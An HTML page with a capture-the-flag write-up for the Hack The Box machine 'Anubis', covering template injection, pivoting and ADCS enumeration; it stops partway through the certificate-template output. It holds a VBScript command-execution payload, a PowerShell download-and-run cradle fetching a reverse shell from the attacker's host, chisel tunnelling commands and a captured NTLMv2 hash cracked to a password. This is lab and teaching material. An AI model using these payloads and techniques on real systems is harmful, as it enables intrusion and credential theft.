@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.5.0.777144154787">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.5.0">
+
+    <!-- Primary Meta Tags -->
+    <title>Anubis</title>
+    <meta name="title" content="Anubis">
+    <meta name="description" content="Fun AD box, starts with Template Injection which leads to landing in a docker container.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://eljayright.github.io/writeups/htb/anubis/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://eljayright.github.io/writeups/htb/anubis/">
+    <meta property="og:title" content="Anubis">
+    <meta property="og:description" content="Fun AD box, starts with Template Injection which leads to landing in a docker container.">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://eljayright.github.io/writeups/htb/anubis/">
+    <meta property="twitter:title" content="Anubis">
+    <meta property="twitter:description" content="Fun AD box, starts with Template Injection which leads to landing in a docker container.">
+
+    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
+
+    <link href="../../../resources/css/retype.css?v=3.5.0.777144154787" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../resources/js/config.js?v=3.5.0.777144154787" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../resources/js/retype.js?v=3.5.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../resources/js/lunr.js?v=3.5.0.777144154787" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../resources/js/prism.js?v=3.5.0.777144154787" defer></script>
+</head>
+<body>
+    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
+        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
+    
+        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="docs-sidebar-toggle"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="docs-site-logo" href="../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ElJayRight</span>
+                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">dev-notes</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/eljayright" target="_blank">
+                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                        <g fill="currentColor">
+                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                        </g>
+                                    </svg>
+                                    <span>GitHub</span>
+                                </a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="docs-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+        <div class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
+            
+                <!-- Render this div, if config.showSidebarFilter is `true` -->
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/eljayright" target="_blank">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                <g fill="currentColor">
+                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
+                                                </g>
+                                            </svg>
+                                            <span>GitHub</span>
+                                        </a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 dark:bg-dark-850">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="docs-markdown" id="docs-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="docs-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="anubis" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#anubis">#</doc-anchor-trigger>
+        <span>Anubis</span>
+    </h1>
+</doc-anchor-target>
+<p>Fun AD box, starts with Template Injection which leads to landing in a docker container. From here there is a pivot to an internal web app which can be manipulated to leak a users NTLMv2 hash. This hash cracks and the user can authenticate to SMB where there is a vulnerable version of Jamovi running which allows for a XSS to RCE CVE. The final step is abusing ESC4 to get Administrator on the box.</p>
+<doc-anchor-target id="enumeration">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
+        <span>Enumeration</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="nmap">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap">#</doc-anchor-trigger>
+        <span>Nmap</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 14:30 AEDT
+Nmap scan report for 10.10.11.102
+Host is up (0.0058s latency).
+Not shown: 996 filtered tcp ports (no-response)
+PORT    STATE SERVICE       VERSION
+135/tcp open  msrpc         Microsoft Windows RPC
+443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_ssl-date: 2024-03-29T04:31:12+00:00; +1h00m00s from scanner time.
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| ssl-cert: Subject: commonName=www.windcorp.htb
+| Subject Alternative Name: DNS:www.windcorp.htb
+| Not valid before: 2021-05-24T19:44:56
+|_Not valid after:  2031-05-24T19:54:56
+|_http-title: Not Found
+445/tcp open  microsoft-ds?
+593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2024-03-29T04:30:34
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 59m59s, deviation: 0s, median: 59m59s
+</code></pre>
+</doc-codeblock></div>
+<p>dns name:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">www.windcorp.htb</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="smb">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#smb">#</doc-anchor-trigger>
+        <span>SMB</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">netexec smb 10.10.11.102
+SMB         10.10.11.102    445    EARTH            [*] Windows 10 / Server 2019 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)</code></pre>
+</doc-codeblock></div>
+<p>domain name and hostname.</p>
+<doc-anchor-target id="https">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#https">#</doc-anchor-trigger>
+        <span>HTTPS</span>
+    </h2>
+</doc-anchor-target>
+<p>Some people which could be mapped to usernames:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">walter white
+sarah jhonson
+william anderson
+amanda jepson</code></pre>
+</doc-codeblock></div>
+<p>reflected content on the submit form.</p>
+<p>Trying ssti and it errors!</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">${{&lt;%[%'&quot;}}%\.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="foothold---template-injection">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold---template-injection">#</doc-anchor-trigger>
+        <span>Foothold - Template Injection</span>
+    </h1>
+</doc-anchor-target>
+<p>As its an asp page I&#x27;m going to try vbs</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">&lt;%= CreateObject(&quot;WScript.Shell&quot;).exec(&quot;whoami&quot;).StdOut.ReadAll() %&gt;</code></pre>
+</doc-codeblock></div>
+<p>This works and shows that we are running as system. Checking this hostname against what we got from netexec.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">&lt;%= CreateObject(&quot;WScript.Shell&quot;).exec(&quot;hostname&quot;).StdOut.ReadAll() %&gt;</code></pre>
+</doc-codeblock></div>
+<p>This outputs as webserver01 so its probs a container or something.</p>
+<p>Going to use a tcp one liner to get a reverse shell. <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1</a></p>
+<p>Hosting the file locally then downloading it with an iex cradle.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">&quot;powershell iex (New-Object Net.WebClient).downloadString('http://10.10.14.4/shell.ps1')&quot;</code></pre>
+</doc-codeblock></div>
+<p>This gives us a shell !</p>
+<doc-anchor-target id="foothold---enumeration">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold---enumeration">#</doc-anchor-trigger>
+        <span>Foothold - Enumeration</span>
+    </h1>
+</doc-anchor-target>
+<p>On The administrators desktop there is a certificate</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">-----BEGIN CERTIFICATE REQUEST-----
+MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
+ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
+Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
+KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
+BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
+eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
+QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
+qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
+1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
+JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
+WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
+yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
+F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
+CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
+4TlwpQ==
+-----END CERTIFICATE REQUEST-----</code></pre>
+</doc-codeblock></div>
+<p>Analysing the cert with openssl shows another hostname:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">softwareportal.windcorp.htb</code></pre>
+</doc-codeblock></div>
+<p>Running nslookup on the host shows it resolves to 172.22.96.1, which is the gateway (again showing this is a docker container).</p>
+<p>Next step is to drop chisel and set up a pivot.</p>
+<p>chisel on the attack machine:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">./chisel server --socks5 --reverse --port 8000</code></pre>
+</doc-codeblock></div>
+<p>chisel on the windows box:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">.\chisel.exe client 10.10.14.4:8000 R:socks</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="internal-webapp">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#internal-webapp">#</doc-anchor-trigger>
+        <span>Internal WebApp</span>
+    </h1>
+</doc-anchor-target>
+<p>quick port scan shows that smb and http are open:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q nmap -p 445,80,8080,443,21 -sT 172.22.96.1 -oA logs/internal-initial
+Nmap scan report for 172.22.96.1
+Host is up (0.034s latency).
+
+PORT     STATE  SERVICE
+21/tcp   closed ftp
+80/tcp   open   http
+443/tcp  closed https
+445/tcp  open   microsoft-ds
+8080/tcp closed http-proxy</code></pre>
+</doc-codeblock></div>
+<p>curling the website shows that there is an install.asp page that expects an ip.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">http://softwareportal.windcorp.htb/install.asp?client=172.22.101.175&amp;software=gimp-2.10.24-setup-3.exe</code></pre>
+</doc-codeblock></div>
+<p>Going to start responder and then send a request with the ip pointing to my machine. This works and gives back a hash:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">[WinRM] NTLMv2 Client   : 10.10.11.102
+[WinRM] NTLMv2 Username : windcorp\localadmin
+[WinRM] NTLMv2 Hash     : localadmin::windcorp:1122334455667788:2F5087D589FDB6A8F79B9BCDC1F09B5A:010100000000000059988EEA9D81DA018E750516C919CC6C0000000002000800590030004C004C0001001E00570049004E002D004300520030004B0044004F004E00370051004B00340004001400590030004C004C002E004C004F00430041004C0003003400570049004E002D004300520030004B0044004F004E00370051004B0034002E00590030004C004C002E004C004F00430041004C0005001400590030004C004C002E004C004F00430041004C000800300030000000000000000000000000210000520F2E7E1C4160A6FE8A94802A1835344DED28584F2BE20E14CD43039F88E3E00A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310034002E0034000000000000000000</code></pre>
+</doc-codeblock></div>
+<p>This cracks with hashcat to give <code v-pre>Secret123</code>. Using this we can now enumerate smb.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">netexec smb 10.10.11.102 -u localadmin -p Secret123 --shares
+SMB         10.10.11.102    445    EARTH            [*] Windows 10 / Server 2019 Build 17763 x64 (name:EARTH) (domain:windcorp.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.102    445    EARTH            [+] windcorp.htb\localadmin:Secret123 
+SMB         10.10.11.102    445    EARTH            [*] Enumerated shares
+SMB         10.10.11.102    445    EARTH            Share           Permissions     Remark
+SMB         10.10.11.102    445    EARTH            -----           -----------     ------
+SMB         10.10.11.102    445    EARTH            ADMIN$                          Remote Admin
+SMB         10.10.11.102    445    EARTH            C$                              Default share
+SMB         10.10.11.102    445    EARTH            CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.10.11.102    445    EARTH            IPC$            READ            Remote IPC
+SMB         10.10.11.102    445    EARTH            NETLOGON        READ            Logon server share 
+SMB         10.10.11.102    445    EARTH            Shared          READ            
+SMB         10.10.11.102    445    EARTH            SYSVOL          READ            Logon server share </code></pre>
+</doc-codeblock></div>
+<p>There is the CertEnroll share which means ADCS is installed which means certipy.</p>
+<doc-anchor-target id="adcs-enumeration">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#adcs-enumeration">#</doc-anchor-trigger>
+        <span>ADCS Enumeration</span>
+    </h2>
+</doc-anchor-target>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">proxychains -q certipy find -enabled -u localadmin@windcorp.htb -p Secret123 -dns-tcp -dc-ip 172.22.96.1 -text -stdout
+Certificate Authorities
+  0
+    CA Name                             : windcorp-CA
+    DNS Name                            : earth.windcorp.htb
+    Certificate Subject                 : CN=windcorp-CA, DC=windcorp, DC=htb
+
+&lt;snip&gt;
+Certificate Templates
+  0
+    Template Name                       : Web
+    Display Name                        : Web
+    Certificate Authorities             : windcorp-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : PublishToDs
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : WINDCORP.HTB\Domain Admins
+                                          WINDCORP.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : WINDCORP.HTB\Administrator
+        Full Control Principals         : WINDCORP.HTB\webdevelopers
+        Write Owner Principals          : WINDCORP.HTB\Domain Admins
+                                          WINDCORP.HTB\Enterprise Admins
+                                          WINDCORP.HTB\Administrator
+                                          WINDCORP.HTB\webdevelopers
+        Write Dacl Principals           : WINDCORP.HTB\Domain Admins
+                                          WINDCORP.HTB\Enterprise Admins
